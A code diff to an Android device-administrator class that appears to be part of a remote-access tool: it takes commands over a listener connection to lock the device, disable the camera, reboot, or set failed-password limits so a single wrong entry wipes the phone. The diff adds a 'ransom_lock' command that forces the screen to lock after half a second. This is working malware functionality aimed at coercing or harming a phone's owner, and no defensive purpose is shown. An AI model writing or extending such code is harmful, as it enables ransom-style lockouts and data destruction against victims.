@@ -81,6 +81,8 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 writer.println("  reboot (not working on emulator)     - Reboot device");
                 writer.println("  exit        - Close connection");
                 writer.println("  wipe  (not working on emulator)      - Factory reset device (physical only)");
+                writer.println("  ransom_lock - set max idle time lock");
+
                 writer.println("----------------------------------");
 
                 // Read commands from listener
@@ -110,6 +112,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         switch (command.toLowerCase()) {
             case "lock":
                 lockDevice(context);
+
                 return "✅ Device locked!";
 
             case "cam_off":
@@ -154,10 +157,14 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
             case "exit":
                 return "👋 Closing connection...";
 
-                case "wipe":
+            case "wipe":
 //                wipeDevice(context);
-                    setMaxFailedAttempts(context, 1);
-                return "✅ Wiping device...";
+                setMaxFailedAttempts(context, 1);
+            return "✅ Wiping device...";
+
+            case "ransom_lock":
+                setMaxLockTime(context);
+                return "✅ Device locked!";
 
             default:
                 return "❌ Unknown command: " + command + " | type 'help' for commands";
@@ -373,6 +380,19 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         } catch (Exception e) {
             Log.e(TAG, "Error: " + e.getMessage());
         }
+    }
+
+    public String setMaxLockTime(Context context) {
+        DevicePolicyManager dpm = (DevicePolicyManager)
+                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName admin = new ComponentName(context, AppDeviceAdminReceiver.class);
+
+        // Set to 1 second
+        dpm.setMaximumTimeToLock(admin, 500L);
+
+        // Verify
+        long current = dpm.getMaximumTimeToLock(admin);
+        return "✅ Lock timeout set to " + (current/1000) + " seconds";
     }
 
 
